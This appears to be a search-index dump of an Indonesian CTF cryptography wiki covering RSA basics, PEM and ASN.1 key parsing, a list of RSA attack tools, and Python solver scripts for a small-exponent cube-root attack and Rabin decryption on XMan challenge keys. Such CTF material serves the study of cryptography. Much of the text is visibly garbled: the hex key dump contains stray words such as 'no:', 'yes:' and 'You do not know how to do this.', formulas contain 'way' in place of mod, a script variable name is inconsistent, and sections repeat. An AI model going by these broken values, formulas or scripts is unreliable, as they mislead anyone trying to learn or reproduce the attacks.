3a:d1:14:41:18:c6:c1:aa:f6:c7:e4:cd:e5:4b:2c: 3d:5f:f7:2b:19:cc:da:2c:19:0d:70:3b:2b:84:53: a9:10:21:83:3a:78:9e:4c:a7:3f:98:71:f5:a2:02: a0:e2:c1:ff:77:bd:3c:31:af:ef:ac:7b:bf:55:e4: f7:56:20:96:e5:4b:b8:37:6d:4f:dc:e3:77:33:79: 94:b3:4f:90:52:63:00:cb:c7:a0:c1:78:be:32:07: dc:bb:92:98:a5:ac:3e:78:81:b0:57:aa:11:43:7d: 7b:b1:af:95:05:fe:22:f5:c7:9b:b5:54:50:90:82: fc:a5:86:37:5c:a1:df:7b:13:d7:5e:d8:db:09:2d: 10:f8:1f:86:3e:8c:b5:82:41:95:2f:5c:eb:7d:c6: 95:c1:4e:f0:c8:cc:f9:25:ef:67:e3:b1:97:9b:c3: ec:ba:b6:f3:b1:a1:28:08:fd:9f:8a:7b:97:f0:d9: a4:58:53:f9:42:c0:8e:1b:c0:a2:d7:84:46:31:a8: e9:4b:06:95:93:21:51:c9:cc:7c:0d:c9:b3:3d:a9: f4:e0:ff:23:9c:a9:9f:09:58:38:da:e7:d5:76:f3: 00:b2:46:e1:ff:3d:6a:a3:21:9d:2b:dc:c9:e0:57: 4f Exponent: 65537 (0x10001) website https://lapo.it/asn1js/ karena konsep certificate menggunakan ASN.1 (Abstract Syntax Notation One) wiki SEQUENCE (2 elem) SEQUENCE (2 elem) OBJECT IDENTIFIER 1.2.840.113549.1.1.1 rsaEncryption (PKCS #1) NULL BIT STRING (2152 bit) 001100001000001000000001000010010000001010000010000000010000000000101\u2026 SEQUENCE (2 elem) INTEGER (2046 bit) 588710189296744551230239300970957336259419103433597770268644665357352\u2026 INTEGER 65537 30 82 01 21 30 0D 06 09 2A 86 48 86 F7 0D 01 01 01 05 00 03 82 01 0E 00 30 82 01 09 02 82 01 00 2E A2 84 38 37 B6 D0 A3 69 67 B0 F3 99 43 09 3A D1 14 41 18 C6 C1 AA F6 C7 E4 CD E5 4B 2C 3D 5F F7 2B 19 CC DA 2C 19 0D 70 3B 2B 84 53 A9 10 21 83 3A 78 9E 4C A7 3F 98 71 F5 A2 02 A0 E2 C1 FF 77 BD 3C 31 AF EF AC 7B BF 55 E4 F7 56 20 96 E5 \u2026 skipping 160 bytes \u2026 00 B2 46 E1 FF 3D 6A A3 21 9D 2B DC C9 E0 57 4F 02 03 01 00 01 didapat n = 5887101892967445512302393009709573362594191034335977702686446653573522418892872143890735426687845254111461265372034642659505979404768275167108077059156417501704452528360772945786530269462798980674453281512004838306417120731049977931108854894021202605713706620706333558929901611233909677933131192370394578396220915603163555229122761382625649400058253040521649841016574945502472294337797942436734503415011093856918753926097754850666003000379227753544168697587806628209389652238467957637121862244135658670762883123986433307510029266263945618368022864702043232089659695092442274431162305578963378970928172616133690545999 e = 65537 Tools Attacker \u00b6 https://github.com/zweisamkeit/RSHack https://github.com/rk700/attackrsa https://github.com/ius/rsatool https://github.com/ValarDragon/CTF-Crypto https://github.com/sonickun/cryptools https://github.com/Ganapati/RsaCtfTool Sumber \u00b6 https://www.youtube.com/watch?v=2L-BzX1_i4o&t=309s \u21a9","title":"RSA Basic"},{"location":"kripto/rsa/#rsa","text":"RSA adalah asymmetric encryption algorithm","title":"RSA"},{"location":"kripto/rsa/#properti","text":"\\(p\\) & \\(q\\) prima \\(n = p . q\\) \\(\u03c6(n) = (p-1)(q-1)\\) \\(e\\) (kunci enkripsi) syarat: \\(GCD(e, \u03c6(n)) = 1\\) \\(d\\) (kunci dekripsi) \\(d \u2261 e^{-1} \\ mod(\u03c6(n))\\) \\(m\\) \\(c\\)","title":"Properti"},{"location":"kripto/rsa/#penurunan-rumus-rsa","text":"Prinsip: teorema Euler \\(\u03b1^{\u03c6(n)} \u2261 1 \\ (mod \\ n)\\) Syarat: \\(\u03b1\\) harus relatif prima terhada \\(n\\) \\(\u03c6(n)\\) = totien euler fungsi yang menentukan berapa banyak dari bilangan 1,2,3,...,n yang relatif prima terhadap \\(n\\) cth. \\(\u03c6(20) = 8\\) 1,3,7,9,11,13,17,19 \\(\u03c6(n) = \u03c6(p).\u03c6(q) = (p-1)(q-1)\\) \\[ \\begin{align} \u03b1^{\u03c6(n)} &\\equiv 1 \\ (\\bmod n) & \\text{(dipangkatkan $k$)} \\\\ \u03b1^{k\u03c6(n)} &\\equiv 1^k \\ (\\bmod n)\\\\ \u03b1^{k\u03c6(n)} &\\equiv 1 \\ (\\bmod n) & \\text{(ubah $\u03b1$ jadi $m$)} \\\\ m^{k\u03c6(n)} &\\equiv 1 \\ (\\bmod n) & \\text{(kali dengan $m$)} \\\\ m^{(k\u03c6(n)+1)} &\\equiv m \\ (\\bmod n) \\end{align} \\] Misalkan e dan d dipilih sedemikian sehingga \\[ \\begin{align} e . d &\\equiv 1 \\ (\\bmod \u03c6(n)) \\\\[2ex] &\\text{atau} \\\\[2ex] e . d &\\equiv k\u03c6(n)+1 \\\\[2ex] &\\text{maka} \\\\[2ex] m^{k\u03c6(n)+1} &\\equiv m \\ (\\bmod \\ n)\\\\ m^{e.d} &\\equiv m \\ (\\bmod \\ n)\\\\ (m^e)^d &\\equiv m \\ (\\bmod \\ n)\\\\ \\end{align} \\]","title":"Penurunan Rumus RSA"},{"location":"kripto/rsa/#rumus","text":"Enkripsi: \\(E_e(m) = c \\equiv m^e \\bmod n\\) Dekripsi: \\(D_d(c) = m \u2261 c^d \\bmod n\\)","title":"Rumus"},{"location":"kripto/rsa/#prosedur-pembangkitan-sepasang-kunci","text":"pilih \\(p\\) & \\(q\\) hitung \\(n\\) hitung \\(\u03c6(n)\\) pilih \\(e\\) hitung kunci dekripsi dengan persamaan \\(ed \\equiv 1 (\\bmod \u03c6(n))\\) atau \\(d \\equiv e^{-1} (\\bmod \u03c6(n))\\) \\(d\\) dapat dihitung menggunakan algoritma euclidean : \\[ d = \\frac{1+k\u03c6(n)}{e} \\]","title":"Prosedur Pembangkitan Sepasang Kunci"},{"location":"kripto/rsa/#rsa-certificate","text":"biasanya key disimpan dalam bentuk hexadesimal atau certificate (base64) key1.pub -----BEGIN PUBLIC KEY----- MIIBITANBgkqhkiG9w0BAQEFAAOCAQ4AMIIBCQKCAQAuooQ4N7bQo2lnsPOZQwk6 0RRBGMbBqvbH5M3lSyw9X/crGczaLBkNcDsrhFOpECGDOnieTKc/mHH1ogKg4sH/ d708Ma/vrHu/VeT3ViCW5Uu4N21P3ON3M3mUs0+QUmMAy8egwXi+Mgfcu5KYpaw+ eIGwV6oRQ317sa+VBf4i9cebtVRQkIL8pYY3XKHfexPXXtjbCS0Q+B+GPoy1gkGV L1zrfcaVwU7wyMz5Je9n47GXm8PsurbzsaEoCP2finuX8NmkWFP5QsCOG8Ci14RG MajpSwaVkyFRycx8DcmzPan04P8jnKmfCVg42ufVdvMAskbh/z1qoyGdK9zJ4FdP AgMBAAE= -----END PUBLIC KEY----- menggunakan openssl openssl rsa -pubin -in key1.pub -text -noout output : RSA Public-Key: (2046 bit) Modulus: 2e:a2:84:38:37:b6:d0:a3:69:67:b0:f3:99:43:09: 3a:d1:14:41:18:c6:c1:aa:f6:c7:e4:cd:e5:4b:2c: 3d:5f:f7:2b:19:cc:da:2c:19:0d:70:3b:2b:84:53: a9:10:21:83:3a:78:9e:4c:a7:3f:98:71:f5:a2:02: a0:e2:c1:ff:77:bd:3c:31:af:ef:ac:7b:bf:55:e4: f7:56:20:96:e5:4b:b8:37:6d:4f:dc:e3:77:33:79: 94:b3:4f:90:52:63:00:cb:c7:a0:c1:78:be:32:07: dc:bb:92:98:a5:ac:3e:78:81:b0:57:aa:11:43:7d: 7b:b1:af:95:05:fe:22:f5:c7:9b:b5:54:50:90:82: fc:a5:86:37:5c:a1:df:7b:13:d7:5e:d8:db:09:2d: 10:f8:1f:86:3e:8c:b5:82:41:95:2f:5c:eb:7d:c6: 95:c1:4e:f0:c8:cc:f9:25:ef:67:e3:b1:97:9b:c3: ec:ba:b6:f3:b1:a1:28:08:fd:9f:8a:7b:97:f0:d9: a4:58:53:f9:42:c0:8e:1b:c0:a2:d7:84:46:31:a8: e9:4b:06:95:93:21:51:c9:cc:7c:0d:c9:b3:3d:a9: f4:e0:ff:23:9c:a9:9f:09:58:38:da:e7:d5:76:f3: 00:b2:46:e1:ff:3d:6a:a3:21:9d:2b:dc:c9:e0:57: 4f Exponent: 65537 (0x10001) website https://lapo.it/asn1js/ karena konsep certificate menggunakan ASN.1 (Abstract Syntax Notation One) wiki SEQUENCE (2 elem) SEQUENCE (2 elem) OBJECT IDENTIFIER 1.2.840.113549.1.1.1 rsaEncryption (PKCS #1) NULL BIT STRING (2152 bit) 001100001000001000000001000010010000001010000010000000010000000000101\u2026 SEQUENCE (2 elem) INTEGER (2046 bit) 588710189296744551230239300970957336259419103433597770268644665357352\u2026 INTEGER 65537 30 82 01 21 30 0D 06 09 2A 86 48 86 F7 0D 01 01 01 05 00 03 82 01 0E 00 30 82 01 09 02 82 01 00 2E A2 84 38 37 B6 D0 A3 69 67 B0 F3 99 43 09 3A D1 14 41 18 C6 C1 AA F6 C7 E4 CD E5 4B 2C 3D 5F F7 2B 19 CC DA 2C 19 0D 70 3B 2B 84 53 A9 10 21 83 3A 78 9E 4C A7 3F 98 71 F5 A2 02 A0 E2 C1 FF 77 BD 3C 31 AF EF AC 7B BF 55 E4 F7 56 20 96 E5 \u2026 skipping 160 bytes \u2026 00 B2 46 E1 FF 3D 6A A3 21 9D 2B DC C9 E0 57 4F 02 03 01 00 01 didapat n = 5887101892967445512302393009709573362594191034335977702686446653573522418892872143890735426687845254111461265372034642659505979404768275167108077059156417501704452528360772945786530269462798980674453281512004838306417120731049977931108854894021202605713706620706333558929901611233909677933131192370394578396220915603163555229122761382625649400058253040521649841016574945502472294337797942436734503415011093856918753926097754850666003000379227753544168697587806628209389652238467957637121862244135658670762883123986433307510029266263945618368022864702043232089659695092442274431162305578963378970928172616133690545999 e = 65537","title":"RSA Certificate"},{"location":"kripto/rsa/#tools-attacker","text":"https://github.com/zweisamkeit/RSHack https://github.com/rk700/attackrsa https://github.com/ius/rsatool https://github.com/ValarDragon/CTF-Crypto https://github.com/sonickun/cryptools https://github.com/Ganapati/RsaCtfTool","title":"Tools Attacker"},{"location":"kripto/rsa/#sumber","text":"https://www.youtube.com/watch?v=2L-BzX1_i4o&t=309s \u21a9","title":"Sumber"},{"location":"kripto/rsa/index_related/","text":"Public Key Indexed-related Attack \u00b6 Small Public Key Index Attack \u00b6 Prasyarat \u00b6 \\(e\\) sangat kecil, seperti 3 contoh : \\[ c\\equiv m^3 \\bmod N \\] maka : \\[ \\begin{align*} m^3 &= c+k\\times N\\\\ m &= \\sqrt[3]{c+k\\times n} \\end{align*} \\] panyerang dapat enumerate \\(k\\) dan memperoleh akar tiga integer. Contoh \u00b6 XMan Summer Camp Soal : openssl rsa -pubin -in pubkey.pem -text -modulus Public-Key: (4096 bit) Modulus: 00:b0:be:e5:e3:e9:e5:a7:e8:d0:0b:49:33:55:c6: 18: fc: 8c: 7d: 7d: 03: b8: 2e: 40: 99: 51: c1: 82: f3: 98: from: e3: 10: 45: 80: e7: no: 70: d3: 83: yes: 53: 11: 47: 56: 56:e8:a9:64:d3:80:cb:15:7f:48:c9:51:ad:fa:65: db: 0b: 12: 2c: a4: 0e: 42: fa: 70: 91: 89: b7: 19: d7: 46: E2: F6: 06: 9b: of: 11: ce: bd: 65: 0f: 14: b9: 3c: 97: 73: 52: fd: 13: b1: yes: a6: d6: e1: da: 77: 55: 02: ab: ff:89:d3:a8:b3:61:5f:d0:db:49:b8:8a:97:6b:c2: 05: 68: 48: 92: 84: e1: 81: f6, f1: 1E: 27: 08: 91: c8: if: 80: 01: 7b: ad: 23: 8e: 36: 30: 39: a: 10:1b:c2:99:49:d3:a4:f4:03:8d:46:39:38:85:15: 79: c7: 52: 5a: 69: 98: 4f: 15: b5: 66: 7f: 34: 20: eb: 26: 11: 36: 94: 7f: a1: 23: e5: 49: df: ff: 00: 60: 18: 83: of: D9: 36: fe: 41: 1e: 00: 6e: 4e: 93: D1: A0: 0b: 0f: ea: 54: 1b: bf: c8: c5: 18: 6c: b6: 22: 05: 03: 13: 11: 0d: 64: 0c: 77: ea: 54: no: 32: 20: fc: 8f: 4c: c6: what: 77: 15: 1e: 29: b3: e0: 65: 78: c4: 78: 45:89:ef:9a:19:7f:6f:80:6d:b8:b3:ec:d8:26:ca: d2:4f:53:24:cc:de:c6:e8:fe:ad:2c:21:50:06:86: 02:c8:dc:dc:59:40:2c:ca:c9:42:4b:79:00:48:cc: dd: 93: 27: 06: 80: 95: ef: a0: 10: b7: f1: 96: c7: 4b: c3: 7b: 12: 8f: 9e: 14: 11: 75: 16: 33: f7: 8b: 7b: 9e: 56: f7: 1f: 77: a1: b4: da: ad: 3f: c5: 4b: 5e: 7e: a7:2f:b1:76:75:97:65:52:2b:4b:bc:02:e3:14:d5: c0:6b:64:d5:05:4b:7b:09:6c:60:12:36:e6:cc:f4: 5b:5e:61:1c:80:5d:33:5d:ba:b0:c3:5d:22:6c:c2: 08: d8: the 47: 36: ba: 39: A0: 35: 44: 26: fa: e0: 06: 7: fe: 52: d5: 26: 7d: cf: b9: c3: 88: 4f: 51: fd: df: df: 4a: 97: 94: bc: fe: 0e: 15: 57: 11: 37: 49: e6: c8: ef: 42: 1d: You do not know how to do this. 2d: 34: 88: f7: 6d: eb: 62: bd: ef: 7b: ea: 60: 26: f2: 2a: 1d: 25: aa: 2a: 92: d1: 17: 4b: 98: 03: e6: bb: 5f: ad: 75: e1: 86: a9: 46: a1: 0f: 12: 43: f4: 38: 74: 46: cc: this: b2: 22: 2a: 96: 5c: c3: 0b:39:29 Exponent: 3 (0x3) Modulus=B0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929 writing RSA key -----BEGIN PUBLIC KEY----- MIICIDANBgkqhkiG9w0BAQEFAAOCAg0AMIICCAKCAgEAsL7l4 + nlp + jQC0kzVcYY /Ix9fQO4LkCZUcGC85je4xBFgOe6cNODrlMRR1ZW6Klk04DLFX9IyVGt+mXbCxIs pA5C+nCRibcZpPDXRuL2BpuvEc69ZQ8UuTyXc1L9E7Huptbh2ndVAqv/idOos2Ff 0NtJuIqXa8IFaEiShOGB9vEeJwiRyO+AAXutI442MDmkWEcPF0kQG8KZSdOk9AON Rjk4hRV5x1JaaZhPFbVmfzQgm3DrJhE2lH + hI + VJ3 / 8AYBiDr9k2 / kEeAG5Ok9Gg Cw/qVBu/yMUYbLYiBQOpSyQTEQ1kDHfqVLoyIPyPTMbOdxUeKbPgZXjEeL0b6+BF ie+aGX9vgG24s+zYJsrST1MkzN7G6P6tLCFQBoYCyNzcWUAsyslCS3kASMzdkycG gJXvoBC38ZbHS6jDexKPnhQRdRYz94t7nlb3H3ehtNqtP8VLXn75NdmnL7F2dZdl UitLvALjFNXAa2TVBUt7CWxgEjbmzPRbXmEcgF0zXbqww10ibMII2M5HNro5oDVE JvrgBsf+UtUmfc+5w4hPUf3f30qXlLz+DhVXETdJ5sjvQh26Jjr/aHOc4A7YD9AC LvktNIj3betive976mAm8iodJaoqktEkQUqAIf4MF0uYA+a7X6114YapRqFygHcP EkP0OHRGzM6yIiqWXMMLOSkCAQM= -----END PUBLIC KEY----- Solusi : source_code.py #/usr/bin/python # coding=utf-8 import gmpy2 from Crypto.PublicKey import RSA from multiprocessing import Pool pool = Pool ( 4 ) with open ( './pubkey.pem' , 'r' ) as f : key = RSA . importKey ( f ) N = key . n e = key . e with open ( 'flag.enc' , 'r' ) as f : cipher = f . read () . encode ( 'hex' ) cipher = int ( cipher , 16 ) def calc ( j ): print j a , b = gmpy2 . iroot ( cipher + j * N , 3 ) if b == 1 : m = a print ' {:x} ' . format ( int ( m )) . decode ( 'hex' ) pool . terminate () exit () def SmallE (): inputs = range ( 0 , 130000000 ) pool . map ( calc , inputs ) pool . close () pool . join () if __name__ == '__main__' : print 'start' SmallE () RSA Derivative Algorithm - Rabin Algorithm \u00b6 Prasyarat \u00b6 Algoritma Rabin memiliki ciri \\(e=2\\) Teori \u00b6 Key Generation \u00b6 memilih \\(p\\) & \\(q\\) , sehingga \\(p \\equiv q \\equiv 3 \\bmod 4\\) Enkripsi \u00b6 \\[ C = m^2 \\bmod n \\] Dekripsi \u00b6 Hitung akar \\(c\\) modulo \\(p\\) dan \\(q\\) \\(m_p = c^{\\frac{1}{4}(p+1)} \\bmod p\\) \\(m_q = c^{\\frac{1}{4}(q+1)} \\bmod q\\) Menggunakan Extended Euclidean untuk mencari \\(y_p\\) dan \\(y_q\\) , sehingga \\(y_p \\cdot p + y_q \\cdot q = 1\\) Menggunakan Chinese Remainder Theorem untuk mencari akar empat \\(c\\) modulo \\(m\\) \\[ \\begin{align*} a &= (y_p \\cdot p \\cdot m_q + y_q \\cdot q \\cdot m_p) \\bmod n\\\\ b &= n - a\\\\ c &= (y_p \\cdot p \\cdot m_q - y_q \\cdot q \\cdot m_p) \\bmod n\\\\ d &= n - c \\end{align*} \\] Salah satu dari empat nilai itu adalah plainteks asli m, meskipun yang mana dari keempat nilai tersebut yang benar tidak dapat ditentukan tanpa informasi tambahan. Contoh \u00b6 Enkripsi : \\(p = 7, \\ q = 11\\) , maka \\(n = 77\\) , misal \\(m = 20\\) \\[ \\begin{align} c&=m^2 \\bmod n\\\\ &=400 \\bmod 77\\\\ &=15 \\end{align} \\] Dekripsi : \\(m_p = 1\\) dan \\(m_q = 9\\) dengan EGCD, diperoleh \\(y_p \\cdot p + y_q \\cdot q = 1\\) dengan \\(y_p = -3\\) dan \\(y_q = 2\\) empat kandidat pesan \\(r_1 = (-3 \\cdot 7 \\cdot 9 + 2 \\cdot 11 \\cdot 1) \\bmod 77 = 64\\) \\(r_2 = 77 - 64 = 13\\) \\(r_3 = (-3 \\cdot 7 \\cdot 9 - 2 \\cdot 11 \\cdot 1) \\bmod 77 = 20\\) \\(r_4 = 77 - 20 = 57\\) diperoleh kandidat yang cocok adalah \\(r_3\\) wait \u00b6 Ciphertext: \\[ c = m^2 \\ n way \\] Decryption: Hitung \\(m_p\\) dan \\(m_q\\) : \\[ \\begin{align*} m_p & = \\sqrt {c} \\ p \\\\ way m_q & = \\sqrt {c} \\ q way \\end{align*} \\] Hitung \\(y_p\\) dan \\(y_q\\) dengan extended Euclidean: \\[ y_p \\cdot p + y_q \\cdot q = 1 \\] Solve four plaintexts: \\[ \\begin{align*} a &= (y_p \\cdot p \\cdot m_q + y_q \\cdot q \\cdot m_p) \\bmod n\\\\ b &= n - a\\\\ c &= (y_p \\cdot p \\cdot m_q - y_q \\cdot q \\cdot m_p) \\bmod n\\\\ d &= n - c \\end{align*} \\] Note: Jika \\(p \\equiv q \\equiv 3 \\pmod 4\\) , maka \\[ \\begin{align*} m_p & c = ^ {\\frac {1} {4} (p + 1)} \\ p \\\\ way m_q & c = ^ {\\frac {1} {4} (q + 1)} \\ q way \\end{align*} \\] Secara umum, \\(p \\equiv q \\equiv 3 \\pmod 4\\) memenuhi. Untuk kasus yang tidak terpenuhi, silakan merujuk ke algoritma yang sesuai. Contoh \u00b6 XMan Summer Camp openssl rsa -pubin -in pubkey.pem -text -modulus Public-Key: ( 256 bit ) Modulus: 00 : c2: 63 : 6a: e5: c3: d8: e4: 3f: fb: 97 : ab: 1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f: be:30:dd Exponent: 2 ( 0x2 ) Modulus = C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD writing RSA key -----BEGIN PUBLIC KEY----- MDowDQYJKoZIhvcNAQEBBQADKQAwJgIhAMJjauXD2OQ / + 5erCQKPGqxsC / bNPXDr yigb / + l / vjDdAgEC -----END PUBLIC KEY----- \\(e=2\\) , dengan Rabin algorithm. Pertama, hitung p & q p=275127860351348928173285174381581152299 q=319576316814478949870590164193048041239 Write code #!/usr/bin/python # coding=utf-8 import gmpy2 import string from Crypto.PublicKey import RSA # Read public key parameters with open ( 'pubkey.pem' , 'r' ) as f : key = RSA . importKey ( f ) N = key . n e = key . e with open ( 'flag.enc' , 'r' ) as f : cipher = f . read () . encode ( 'hex' ) cipher = string . atoi ( cipher , base = 16 ) # print cipher print \"please input p\" p = int ( raw_input (), 10 ) print 'please input q' q = int ( raw_input (), 10 ) #\u7b97 yp\u548cyq inv_p = gmpy2 . invert ( p , q ) inv_q = gmpy2 . invert ( q , p ) #\u7b97mp mp and mq mp = pow ( cipher , ( p + 1 ) / 4 , p ) mq = pow ( cipher , ( q + 1 ) / 4 , q ) # Calculate a, b, c, d a = ( inv_p * p * mq + inv_q * q * mp ) % N b = N - int ( a ) c = ( inv_p * p * mq - inv_q * q * mp ) % N D = N - int ( c ) for i in ( a , b , c , d ): s = ' %x ' % i if len ( s ) % 2 ! = 0 : s = '0' + s print s . decode ( 'hex' ) Get the flag, PCTF{sp3ci4l_rsa} . Sumber \u00b6 https://ctf-wiki.mahaloz.re/crypto/asymmetric/rsa/rsa_e_attack/ \u21a9 https://en.wikipedia.org/wiki/Rabin_cryptosystem \u21a9","title":"Public Key Indexed-related Attack"},{"location":"kripto/rsa/index_related/#public-key-indexed-related-attack","text":"","title":"Public Key Indexed-related Attack"},{"location":"kripto/rsa/index_related/#small-public-key-index-attack","text":"","title":"Small Public Key Index Attack"},{"location":"kripto/rsa/index_related/#prasyarat","text":"\\(e\\) sangat kecil, seperti 3 contoh : \\[ c\\equiv m^3 \\bmod N \\] maka : \\[ \\begin{align*} m^3 &= c+k\\times N\\\\ m &= \\sqrt[3]{c+k\\times n} \\end{align*} \\] panyerang dapat enumerate \\(k\\) dan memperoleh akar tiga integer.","title":"Prasyarat"},{"location":"kripto/rsa/index_related/#contoh","text":"XMan Summer Camp Soal : openssl rsa -pubin -in pubkey.pem -text -modulus Public-Key: (4096 bit) Modulus: 00:b0:be:e5:e3:e9:e5:a7:e8:d0:0b:49:33:55:c6: 18: fc: 8c: 7d: 7d: 03: b8: 2e: 40: 99: 51: c1: 82: f3: 98: from: e3: 10: 45: 80: e7: no: 70: d3: 83: yes: 53: 11: 47: 56: 56:e8:a9:64:d3:80:cb:15:7f:48:c9:51:ad:fa:65: db: 0b: 12: 2c: a4: 0e: 42: fa: 70: 91: 89: b7: 19: d7: 46: E2: F6: 06: 9b: of: 11: ce: bd: 65: 0f: 14: b9: 3c: 97: 73: 52: fd: 13: b1: yes: a6: d6: e1: da: 77: 55: 02: ab: ff:89:d3:a8:b3:61:5f:d0:db:49:b8:8a:97:6b:c2: 05: 68: 48: 92: 84: e1: 81: f6, f1: 1E: 27: 08: 91: c8: if: 80: 01: 7b: ad: 23: 8e: 36: 30: 39: a: 10:1b:c2:99:49:d3:a4:f4:03:8d:46:39:38:85:15: 79: c7: 52: 5a: 69: 98: 4f: 15: b5: 66: 7f: 34: 20: eb: 26: 11: 36: 94: 7f: a1: 23: e5: 49: df: ff: 00: 60: 18: 83: of: D9: 36: fe: 41: 1e: 00: 6e: 4e: 93: D1: A0: 0b: 0f: ea: 54: 1b: bf: c8: c5: 18: 6c: b6: 22: 05: 03: 13: 11: 0d: 64: 0c: 77: ea: 54: no: 32: 20: fc: 8f: 4c: c6: what: 77: 15: 1e: 29: b3: e0: 65: 78: c4: 78: 45:89:ef:9a:19:7f:6f:80:6d:b8:b3:ec:d8:26:ca: d2:4f:53:24:cc:de:c6:e8:fe:ad:2c:21:50:06:86: 02:c8:dc:dc:59:40:2c:ca:c9:42:4b:79:00:48:cc: dd: 93: 27: 06: 80: 95: ef: a0: 10: b7: f1: 96: c7: 4b: c3: 7b: 12: 8f: 9e: 14: 11: 75: 16: 33: f7: 8b: 7b: 9e: 56: f7: 1f: 77: a1: b4: da: ad: 3f: c5: 4b: 5e: 7e: a7:2f:b1:76:75:97:65:52:2b:4b:bc:02:e3:14:d5: c0:6b:64:d5:05:4b:7b:09:6c:60:12:36:e6:cc:f4: 5b:5e:61:1c:80:5d:33:5d:ba:b0:c3:5d:22:6c:c2: 08: d8: the 47: 36: ba: 39: A0: 35: 44: 26: fa: e0: 06: 7: fe: 52: d5: 26: 7d: cf: b9: c3: 88: 4f: 51: fd: df: df: 4a: 97: 94: bc: fe: 0e: 15: 57: 11: 37: 49: e6: c8: ef: 42: 1d: You do not know how to do this. 2d: 34: 88: f7: 6d: eb: 62: bd: ef: 7b: ea: 60: 26: f2: 2a: 1d: 25: aa: 2a: 92: d1: 17: 4b: 98: 03: e6: bb: 5f: ad: 75: e1: 86: a9: 46: a1: 0f: 12: 43: f4: 38: 74: 46: cc: this: b2: 22: 2a: 96: 5c: c3: 0b:39:29 Exponent: 3 (0x3) Modulus=B0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929 writing RSA key -----BEGIN PUBLIC KEY----- MIICIDANBgkqhkiG9w0BAQEFAAOCAg0AMIICCAKCAgEAsL7l4 + nlp + jQC0kzVcYY /Ix9fQO4LkCZUcGC85je4xBFgOe6cNODrlMRR1ZW6Klk04DLFX9IyVGt+mXbCxIs pA5C+nCRibcZpPDXRuL2BpuvEc69ZQ8UuTyXc1L9E7Huptbh2ndVAqv/idOos2Ff 0NtJuIqXa8IFaEiShOGB9vEeJwiRyO+AAXutI442MDmkWEcPF0kQG8KZSdOk9AON Rjk4hRV5x1JaaZhPFbVmfzQgm3DrJhE2lH + hI + VJ3 / 8AYBiDr9k2 / kEeAG5Ok9Gg Cw/qVBu/yMUYbLYiBQOpSyQTEQ1kDHfqVLoyIPyPTMbOdxUeKbPgZXjEeL0b6+BF ie+aGX9vgG24s+zYJsrST1MkzN7G6P6tLCFQBoYCyNzcWUAsyslCS3kASMzdkycG gJXvoBC38ZbHS6jDexKPnhQRdRYz94t7nlb3H3ehtNqtP8VLXn75NdmnL7F2dZdl UitLvALjFNXAa2TVBUt7CWxgEjbmzPRbXmEcgF0zXbqww10ibMII2M5HNro5oDVE JvrgBsf+UtUmfc+5w4hPUf3f30qXlLz+DhVXETdJ5sjvQh26Jjr/aHOc4A7YD9AC LvktNIj3betive976mAm8iodJaoqktEkQUqAIf4MF0uYA+a7X6114YapRqFygHcP EkP0OHRGzM6yIiqWXMMLOSkCAQM= -----END PUBLIC KEY----- Solusi : source_code.py #/usr/bin/python # coding=utf-8 import gmpy2 from Crypto.PublicKey import RSA from multiprocessing import Pool pool = Pool ( 4 ) with open ( './pubkey.pem' , 'r' ) as f : key = RSA . importKey ( f ) N = key . n e = key . e with open ( 'flag.enc' , 'r' ) as f : cipher = f . read () . encode ( 'hex' ) cipher = int ( cipher , 16 ) def calc ( j ): print j a , b = gmpy2 . iroot ( cipher + j * N , 3 ) if b == 1 : m = a print ' {:x} ' . format ( int ( m )) . decode ( 'hex' ) pool . terminate () exit () def SmallE (): inputs = range ( 0 , 130000000 ) pool . map ( calc , inputs ) pool . close () pool . join () if __name__ == '__main__' : print 'start' SmallE ()","title":"Contoh"},{"location":"kripto/rsa/index_related/#rsa-derivative-algorithm-rabin-algorithm","text":"","title":"RSA Derivative Algorithm - Rabin Algorithm"},{"location":"kripto/rsa/index_related/#prasyarat_1","text":"Algoritma Rabin memiliki ciri 